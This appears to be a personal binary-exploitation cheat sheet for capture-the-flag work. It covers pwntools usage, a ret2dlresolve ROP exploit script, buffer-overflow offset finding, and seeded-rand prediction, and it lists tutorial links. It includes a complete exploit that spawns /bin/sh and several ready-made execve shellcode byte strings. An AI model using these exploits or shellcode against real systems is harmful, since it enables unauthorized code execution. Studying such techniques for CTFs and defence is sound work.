### pwntools
Generate pwntools template exploit script
```c
pwn template --quiet --host "hostname" --port "portnumber" ./binary > exploit.py
```
gdb attach
```python
gdb.attach(io, gdbscript=gdbscript)
```

# Disassemble
```shell
objdump -M intel -d binary
```

# Check for ALSR
```c
ldd binary
```

#### ret2dlresolve
https://ir0nstone.gitbook.io/notes/types/stack/ret2dlresolve/exploitation
```python
from pwn import *

elf = context.binary = ELF('./vuln', checksec=False)
p = elf.process()
rop = ROP(elf)

# create the dlresolve object
dlresolve = Ret2dlresolvePayload(elf, symbol='system', args=['/bin/sh'])

rop.raw('A' * 76)
rop.read(0, dlresolve.data_addr) # read to where we want to write the fake structures
rop.ret2dlresolve(dlresolve)     # call .plt and dl-resolve() with the correct, calculated reloc_offset

log.info(rop.dump())

p.sendline(rop.chain())
p.sendline(dlresolve.payload)    # now the read is called and we pass all the relevant structures in

p.interactive()
```


# Buffer overflow


### Finding offset
```
AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZ
```

### Callstack
https://zhu45.org/posts/2017/Jul/30/understanding-how-function-call-works/

### Symbols-table (Finds addresses of functions)
```shell
objdump -t PROGRAM
```

### Shellcode
https://shell-storm.org/shellcode/index.html
https://www.exploit-db.com/

Jump to shellcode: 
https://www.abatchy.com/2017/05/jumping-to-shellcode.html

Creating shellcode:
https://hackmd.io/@5wGZ4MZ5RNqqVEVaLzb0rA/BJikOPqw5

Ex:
```c
// Linux/x86 execve /bin/sh shellcode 23 bytes
shellcode = b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"

// Linux/x86 execve /bin/sh shellcode 21 bytes
shellcode = b"\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80"

// Linux/x86-64 Execute /bin/sh - 27 bytes
shellcode = b"\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"

// Linux/x86-64 exec /bin/sh alphanumerical
shellcode = "XXj0TYX45Pk13VX40473At1At1qu1qv1qwHcyt14yH34yhj5XVX1FK1FSH3FOPTj0X40PP4u4NZ4jWSEW18EF0V"
```

To run:
```bash
$ (python exploit.py; cat) | ./vuln_program
```

# Syscalls
https://syscall.sh/


# Useful snippets
### Running C-Functions in Python
```python
from ctypes import CDLL

libc = CDLL("libc.so.6")  
libc.srand(libc.time(0))
output = libc.rand() % 0xf
```

### Get "random" value based on time-seed
```c
#include <time.h>
#include <stdio.h>
#include <stdlib.h>

int main() {
    int t = time(0);
    srand(t);
    printf("%d\n", rand() & 0xf);
}
```

### Get output from Linux command in Python
```python
import subprocess

output = subprocess.check_output("./vuln")
```




#### 64 bit function arguments order 
In 64 bit, the arguments are in registers, 32 bit is on the stack.
Arguments are placed before the function.
RAX is the return value
```c
RDI, RSI, RDX, RCX, R8, R9
```

#### Finding functions in libc
```c
readelf -s libc6_2.33.so | grep system
```


# Assembly
```asm
.global _start

_start:
.intel_syntax noprefix
```
```
gcc -nostdlib -static level1.s -o level1-elf
objcopy --dump-section .text=level1 level1-elf
```




# Kernel pwn
https://lkmidas.github.io/posts/20210123-linux-kernel-pwn-part-1/


# Notes from the web

https://ir0nstone.gitbook.io/notes/
https://ropemporium.com/guide.html
https://filippo.io/linux-syscall-table/
https://ctf.samsongama.com/ctf/index.html
https://www.pwnthebox.net/reverse/engineering/and/binary/exploitation/series/2019/03/30/return-oriented-programming-part2.html syscalls
https://github.com/0xroman1/Scuffed_Low_Level_Stash/blob/master/README.md


https://cs61.seas.harvard.edu/site/2018/ SYKT BRA
### Advanced ROP
https://tc.gts3.org/cs6265/2019/tut/tut06-02-advrop.html

